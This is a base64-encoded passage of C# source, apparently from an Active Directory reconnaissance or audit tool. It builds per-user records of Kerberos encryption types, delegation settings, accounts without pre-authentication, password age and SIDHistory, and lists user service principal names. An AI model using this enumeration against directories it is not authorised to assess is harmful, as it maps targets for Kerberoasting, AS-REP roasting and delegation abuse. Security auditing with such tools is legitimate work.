gICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBLZXJiZXJvc1JDNCA9ICh1c2VyS2VyYkVuY0ZsYWdzICYgS2VyYkVuY0ZsYWdzLlJDNF9ITUFDKSA9PSBLZXJiRW5jRmxhZ3MuUkM0X0hNQUM7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBLZXJiZXJvc0FFUzEyOCA9ICh1c2VyS2VyYkVuY0ZsYWdzICYgS2VyYkVuY0ZsYWdzLkFFUzEyOF9DVFNfSE1BQ19TSEExXzk2KSA9PSBLZXJiRW5jRmxhZ3MuQUVTMTI4X0NUU19ITUFDX1NIQTFfOTY7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBLZXJiZXJvc0FFUzI1NiA9ICh1c2VyS2VyYkVuY0ZsYWdzICYgS2VyYkVuY0ZsYWdzLkFFUzI1Nl9DVFNfSE1BQ19TSEExXzk2KSA9PSBLZXJiRW5jRmxhZ3MuQUVTMjU2X0NUU19ITUFDX1NIQTFfOTY7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKChib29sKSBBZFVzZXIuTWVtYmVyc1siVHJ1c3RlZEZvckRlbGVnYXRpb24iXS5WYWx1ZSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIERlbGVnYXRpb25UeXBlID0gIlVuY29uc3RyYWluZWQiOwogICAgICAgICAgICAgICAgICAgICAgICBEZWxlZ2F0aW9uU2VydmljZXMgPSAiQW55IjsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKEFkVXNlci5NZW1iZXJzWyJtc0RTLUFsbG93ZWRUb0RlbGVnYXRlVG8iXSAhPSBudWxsKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgTWljcm9zb2Z0LkFjdGl2ZURpcmVjdG9yeS5NYW5hZ2VtZW50LkFEUHJvcGVydHlWYWx1ZUNvbGxlY3Rpb24gZGVsZWdhdGV0byA9IChNaWNyb3NvZnQuQWN0aXZlRGlyZWN0b3J5Lk1hbmFnZW1lbnQuQURQcm9wZXJ0eVZhbHVlQ29sbGVjdGlvbikgQWRVc2VyLk1lbWJlcnNbIm1zRFMtQWxsb3dlZFRvRGVsZWdhdGVUbyJdLlZhbHVlOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoZGVsZWdhdGV0by5WYWx1ZSAhPSBudWxsKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBEZWxlZ2F0aW9uVHlwZSA9ICJDb25zdHJhaW5lZCI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZGVsZWdhdGV0by5WYWx1ZSBpcyBTeXN0ZW0uU3RyaW5nW10pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAodmFyIHZhbHVlIGluIChTdHJpbmdbXSkgZGVsZWdhdGV0by5WYWx1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIERlbGVnYXRpb25TZXJ2aWNlcyA9IERlbGVnYXRpb25TZXJ2aWNlcyArICIsIiArIENvbnZlcnQuVG9TdHJpbmcodmFsdWUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEZWxlZ2F0aW9uU2VydmljZXMgPSBEZWxlZ2F0aW9uU2VydmljZXMuVHJpbVN0YXJ0KCcsJyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRGVsZWdhdGlvblNlcnZpY2VzID0gQ29udmVydC5Ub1N0cmluZyhkZWxlZ2F0ZXRvLlZhbHVlKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoKGJvb2wpIEFkVXNlci5NZW1iZXJzWyJUcnVzdGVkVG9BdXRoRm9yRGVsZWdhdGlvbiJdLlZhbHVlID09IHRydWUpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBEZWxlZ2F0aW9uUHJvdG9jb2wgPSAiQW55IjsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAoRGVsZWdhdGlvblR5cGUgIT0gbnVsbCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIERlbGVnYXRpb25Qcm90b2NvbCA9ICJLZXJiZXJvcyI7CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBQU09iamVjdCBVc2VyT2JqID0gbmV3IFBTT2JqZWN0KCk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlVzZXJOYW1lIiwgQWRVc2VyLk1lbWJlcnNbIlNhbUFjY291bnROYW1lIl0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTmFtZSIsIENsZWFuU3RyaW5nKEFkVXNlci5NZW1iZXJzWyJOYW1lIl0uVmFsdWUpKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkVuYWJsZWQiLCBFbmFibGVkKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIk11c3QgQ2hhbmdlIFBhc3N3b3JkIGF0IExvZ29uIiwgTXVzdENoYW5nZVBhc3N3b3JkYXRMb2dvbikpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJDYW5ub3QgQ2hhbmdlIFBhc3N3b3JkIiwgQWRVc2VyLk1lbWJlcnNbIkNhbm5vdENoYW5nZVBhc3N3b3JkIl0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiUGFzc3dvcmQgTmV2ZXIgRXhwaXJlcyIsIEFkVXNlci5NZW1iZXJzWyJQYXNzd29yZE5ldmVyRXhwaXJlcyJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlJldmVyc2libGUgUGFzc3dvcmQgRW5jcnlwdGlvbiIsIEFkVXNlci5NZW1iZXJzWyJBbGxvd1JldmVyc2libGVQYXNzd29yZEVuY3J5cHRpb24iXS5WYWx1ZSkpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJTbWFydGNhcmQgTG9nb24gUmVxdWlyZWQiLCBBZFVzZXIuTWVtYmVyc1siU21hcnRjYXJkTG9nb25SZXF1aXJlZCJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkRlbGVnYXRpb24gUGVybWl0dGVkIiwgISgoYm9vbCkgQWRVc2VyLk1lbWJlcnNbIkFjY291bnROb3REZWxlZ2F0ZWQiXS5WYWx1ZSkpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiS2VyYmVyb3MgREVTIE9ubHkiLCBBZFVzZXIuTWVtYmVyc1siVXNlREVTS2V5T25seSJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIktlcmJlcm9zIFJDNCIsIEtlcmJlcm9zUkM0KSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIktlcmJlcm9zIEFFUy0xMjhiaXQiLCBLZXJiZXJvc0FFUzEyOCkpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJLZXJiZXJvcyBBRVMtMjU2Yml0IiwgS2VyYmVyb3NBRVMyNTYpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiRG9lcyBOb3QgUmVxdWlyZSBQcmUgQXV0aCIsIEFkVXNlci5NZW1iZXJzWyJEb2VzTm90UmVxdWlyZVByZUF1dGgiXS5WYWx1ZSkpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJOZXZlciBMb2dnZWQgaW4iLCBOZXZlckxvZ2dlZEluKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkxvZ29uIEFnZSAoZGF5cykiLCBEYXlzU2luY2VMYXN0TG9nb24pKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiUGFzc3dvcmQgQWdlIChkYXlzKSIsIERheXNTaW5jZUxhc3RQYXNzd29yZENoYW5nZSkpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEb3JtYW50ICg+ICIgKyBEb3JtYW50VGltZVNwYW4gKyAiIGRheXMpIiwgRG9ybWFudCkpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJQYXNzd29yZCBBZ2UgKD4gIiArIFBhc3NNYXhBZ2UgKyAiIGRheXMpIiwgUGFzc3dvcmROb3RDaGFuZ2VkYWZ0ZXJNYXhBZ2UpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiQWNjb3VudCBMb2NrZWQgT3V0IiwgQWRVc2VyLk1lbWJlcnNbIkxvY2tlZE91dCJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlBhc3N3b3JkIEV4cGlyZWQiLCBBZFVzZXIuTWVtYmVyc1siUGFzc3dvcmRFeHBpcmVkIl0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiUGFzc3dvcmQgTm90IFJlcXVpcmVkIiwgQWRVc2VyLk1lbWJlcnNbIlBhc3N3b3JkTm90UmVxdWlyZWQiXS5WYWx1ZSkpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEZWxlZ2F0aW9uIFR5cGUiLCBEZWxlZ2F0aW9uVHlwZSkpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEZWxlZ2F0aW9uIFByb3RvY29sIiwgRGVsZWdhdGlvblByb3RvY29sKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkRlbGVnYXRpb24gU2VydmljZXMiLCBEZWxlZ2F0aW9uU2VydmljZXMpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTG9nb24gV29ya3N0YXRpb25zIiwgQWRVc2VyLk1lbWJlcnNbIkxvZ29uV29ya3N0YXRpb25zIl0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiQWRtaW5Db3VudCIsIEFkVXNlci5NZW1iZXJzWyJBZG1pbkNvdW50Il0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiUHJpbWFyeSBHcm91cElEIiwgQWRVc2VyLk1lbWJlcnNbInByaW1hcnlHcm91cElEIl0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiU0lEIiwgQWRVc2VyLk1lbWJlcnNbIlNJRCJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlNJREhpc3RvcnkiLCBTSURIaXN0b3J5KSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkRlc2NyaXB0aW9uIiwgQ2xlYW5TdHJpbmcoQWRVc2VyLk1lbWJlcnNbIkRlc2NyaXB0aW9uIl0uVmFsdWUpKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlRpdGxlIiwgQ2xlYW5TdHJpbmcoQWRVc2VyLk1lbWJlcnNbIlRpdGxlIl0uVmFsdWUpKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkRlcGFydG1lbnQiLCBDbGVhblN0cmluZyhBZFVzZXIuTWVtYmVyc1siRGVwYXJ0bWVudCJdLlZhbHVlKSkpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJDb21wYW55IiwgQ2xlYW5TdHJpbmcoQWRVc2VyLk1lbWJlcnNbIkNvbXBhbnkiXS5WYWx1ZSkpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTWFuYWdlciIsIENsZWFuU3RyaW5nKEFkVXNlci5NZW1iZXJzWyJNYW5hZ2VyIl0uVmFsdWUpKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkluZm8iLCBDbGVhblN0cmluZyhBZFVzZXIuTWVtYmVyc1siSW5mbyJdLlZhbHVlKSkpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJMYXN0IExvZ29uIERhdGUiLCBMYXN0TG9nb25EYXRlKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlBhc3N3b3JkIExhc3RTZXQiLCBQYXNzd29yZExhc3RTZXQpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiQWNjb3VudCBFeHBpcmF0aW9uIERhdGUiLCBBY2NvdW50RXhwaXJlcykpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJBY2NvdW50IEV4cGlyYXRpb24gKGRheXMpIiwgQWNjb3VudEV4cGlyYXRpb25OdW1vZkRheXMpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTW9iaWxlIiwgQ2xlYW5TdHJpbmcoQWRVc2VyLk1lbWJlcnNbIk1vYmlsZSJdLlZhbHVlKSkpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJFbWFpbCIsIENsZWFuU3RyaW5nKEFkVXNlci5NZW1iZXJzWyJtYWlsIl0uVmFsdWUpKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkhvbWVEaXJlY3RvcnkiLCBBZFVzZXIuTWVtYmVyc1siaG9tZURpcmVjdG9yeSJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlByb2ZpbGVQYXRoIiwgQWRVc2VyLk1lbWJlcnNbInByb2ZpbGVQYXRoIl0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiU2NyaXB0UGF0aCIsIEFkVXNlci5NZW1iZXJzWyJTY3JpcHRQYXRoIl0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiVXNlckFjY291bnRDb250cm9sIiwgQWRVc2VyLk1lbWJlcnNbIlVzZXJBY2NvdW50Q29udHJvbCJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkZpcnN0IE5hbWUiLCBDbGVhblN0cmluZyhBZFVzZXIuTWVtYmVyc1siZ2l2ZW5OYW1lIl0uVmFsdWUpKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIk1pZGRsZSBOYW1lIiwgQ2xlYW5TdHJpbmcoQWRVc2VyLk1lbWJlcnNbIm1pZGRsZU5hbWUiXS5WYWx1ZSkpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTGFzdCBOYW1lIiwgQ2xlYW5TdHJpbmcoQWRVc2VyLk1lbWJlcnNbInNuIl0uVmFsdWUpKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkNvdW50cnkiLCBDbGVhblN0cmluZyhBZFVzZXIuTWVtYmVyc1siYyJdLlZhbHVlKSkpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJ3aGVuQ3JlYXRlZCIsIEFkVXNlci5NZW1iZXJzWyJ3aGVuQ3JlYXRlZCJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIndoZW5DaGFuZ2VkIiwgQWRVc2VyLk1lbWJlcnNbIndoZW5DaGFuZ2VkIl0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiRGlzdGluZ3Vpc2hlZE5hbWUiLCBDbGVhblN0cmluZyhBZFVzZXIuTWVtYmVyc1siRGlzdGluZ3Vpc2hlZE5hbWUiXS5WYWx1ZSkpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiQ2Fub25pY2FsTmFtZSIsIEFkVXNlci5NZW1iZXJzWyJDYW5vbmljYWxOYW1lIl0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFBTT2JqZWN0W10geyBVc2VyT2JqIH07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGUpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoInswfSBFeGNlcHRpb24gY2F1Z2h0LiIsIGUpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUFNPYmplY3RbXSB7IH07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGNsYXNzIFVzZXJTUE5SZWNvcmRQcm9jZXNzb3IgOiBJUmVjb3JkUHJvY2Vzc29yCiAgICAgICAgewogICAgICAgICAgICBwdWJsaWMgUFNPYmplY3RbXSBwcm9jZXNzUmVjb3JkKE9iamVjdCByZWNvcmQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFBTT2JqZWN0IEFkVXNlciA9IChQU09iamVjdCkgcmVjb3JkOwogICAgICAgICAgICAgICAgICAgIExpc3Q8UFNPYmplY3Q+IFNQTkxpc3QgPSBuZXcgTGlzdDxQU09iamVjdD4oKTsKICAgICAgICAgICAgICAgICAgICBib29sPyBFbmFibGVkID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICBTdHJpbmcgTWVtYmVyb2YgPSBudWxsOwogICAgICAgICAgICAgICAgICAgIERhdGVUaW1lPyBQYXNzd29yZExhc3RTZXQgPSBudWxsOwoKICAgICAgICAgICAgICAgICAgICAvLyBXaGVuIHRoZSB1c2VyIGlzIG5vdCBhbGxvd2VkIHRvIHF1ZXJ5IHRoZSBVc2VyQWNjb3VudENvbnRyb2wgYXR0cmlidXRlLgogICAgICAgICAgICAgICAgICAgIGlmIChBZFVzZXIuTWVtYmVyc1sidXNlckFjY291bnRDb250cm9sIl0uVmFsdWUgIT0gbnVsbCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciB1c2VyRmxhZ3MgPSAoVUFDRmxhZ3MpIEFkVXNlci5NZW1iZXJzWyJ1c2VyQWNjb3VudENvbnRyb2wiXS5WYWx1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgRW5hYmxlZCA9ICEoKHVzZXJGbGFncyAmIFVBQ0ZsYWdzLkFDQ09VTlRESVNBQkxFKSA9PSBVQUNGbGFncy5BQ0NPVU5URElTQUJMRSk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmIChDb252ZXJ0LlRvU3RyaW5nKEFkVXNlci5NZW1iZXJzWyJwd2RMYXN0U2V0Il0uVmFsdWUpICE9ICIwIikKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhc3N3b3JkTGFzdFNldCA9IERhdGVUaW1lLkZyb21GaWxlVGltZSgobG9uZylBZFVzZXIuTWVtYmVyc1sicHdkTGFzdFNldCJdLlZhbHVlKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgTWljcm9zb2Z0LkFjdGl2ZURpcmVjdG9yeS5NYW5hZ2VtZW50LkFEUHJvcGVydHlWYWx1ZUNvbGxlY3Rpb24gU1BOcyA9IChNaWNyb3NvZnQuQWN0aXZlRGlyZWN0b3J5Lk1hbmFnZW1lbnQuQURQcm9wZXJ0eVZhbHVlQ29sbGVjdGlvbilBZFVzZXIuTWVtYmVyc1sic2VydmljZVByaW5jaXBhbE5hbWUiXS5WYWx1ZTsKICAgICAgICAgICAgICAgICAgICBNaWNyb3NvZnQuQWN0aXZlRGlyZWN0b3J5Lk1hbmFnZW1lbnQuQURQcm9wZXJ0eVZhbHVlQ29sbGVjdGlvbiBNZW1iZXJPZkF0dHJpYnV0ZSA9IChNaWNyb3NvZnQuQWN0aXZlRGlyZWN0b3J5Lk1hbmFnZW1lbnQuQURQcm9wZXJ0eVZhbHVlQ29sbGVjdGlvbilBZFVzZXIuTWVtYmVyc1sibWVtYmVyb2YiXS5WYWx1ZTsKICAgICAgICAgICAgICAgICAgICBpZiAoTWVtYmVyT2ZBdHRyaWJ1dGUuVmFsdWUgaXMgU3lzdGVtLlN0cmluZ1tdKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoU3RyaW5nIE1lbWJlciBpbiAoU3lzdGVtLlN0cmluZ1tdKU1lbWJlck9mQXR0cmlidXRlLlZhbHVlKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBNZW1iZXJvZiA9IE1lbWJlcm9mICsgIiwiICsgKChDb252ZXJ0LlRvU3RyaW5nKE1lbWJlcikpLlNwbGl0KCcsJylbMF0pLlNwbGl0KCc9JylbMV07CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgTWVtYmVyb2YgPSBNZW1iZXJvZi5UcmltU3RhcnQoJywnKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAoTWVtYmVyb2YgIT0gbnVsbCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIE1lbWJlcm9mID0gKChDb252ZXJ0LlRvU3RyaW5nKE1lbWJlck9mQXR0cmlidXRlLlZhbHVlKSkuU3BsaXQoJywnKVswXSkuU3BsaXQoJz0nKVsxXTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIERlc2NyaXB0aW9uID0gQ2xlYW5TdHJpbmcoQWRVc2VyLk1lbWJlcnNbIkRlc2NyaXB0aW9uIl0uVmFsdWUpOwogICAgICAgICAgICAgICAgICAgIFN0cmluZyBQcmltYXJ5R3JvdXBJRCA9IENvbnZlcnQuVG9TdHJpbmcoQWRVc2VyLk1lbWJlcnNbInByaW1hcnlHcm91cElEIl0uVmFsdWUpOwogICAgICAgICAgICAgICAgICAgIGlmIChTUE5zLlZhbHVlIGlzIFN5c3RlbS5TdHJpbmdbXSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKFN0cmluZyBTUE4gaW4gKFN5c3RlbS5TdHJpbmdbXSlTUE5zLlZhbHVlKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdHJpbmdbXSBTUE5BcnJheSA9IFNQTi5TcGxpdCgnLycpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUFNPYmplY3QgVXNlclNQTk9iaiA9IG5ldyBQU09iamVjdCgpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgVXNlclNQTk9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIk5hbWUiLCBBZFVzZXIuTWVtYmVyc1siTmFtZSJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBVc2VyU1BOT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiVXNlcm5hbWUiLCBBZFVzZXIuTWVtYmVyc1siU2FtQWNjb3VudE5hbWUiXS5WYWx1ZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgVXNlclNQTk9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkVuYWJsZWQiLCBFbmFibGVkKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBVc2VyU1BOT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiU2VydmljZSIsIFNQTkFycmF5WzBdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBVc2VyU1BOT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiSG9zdCIsIFNQTkFycmF5WzFdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBVc2VyU1BOT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiUGFzc3dvcmQgTGFzdCBTZXQiLCBQYXNzd29yZExhc3RTZXQpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFVzZXJTUE5PYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEZXNjcmlwdGlvbiIsIERlc2NyaXB0aW9uKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBVc2VyU1BOT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiUHJpbWFyeSBHcm91cElEIiwgUHJpbWFyeUdyb3VwSUQpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFVzZXJTUE5PYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJNZW1iZXJvZiIsIE1lbWJlcm9mKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTUE5MaXN0LkFkZCggVXNlclNQTk9iaiApOwogICAgICAgICAgICAgICAgICAgICAgICB9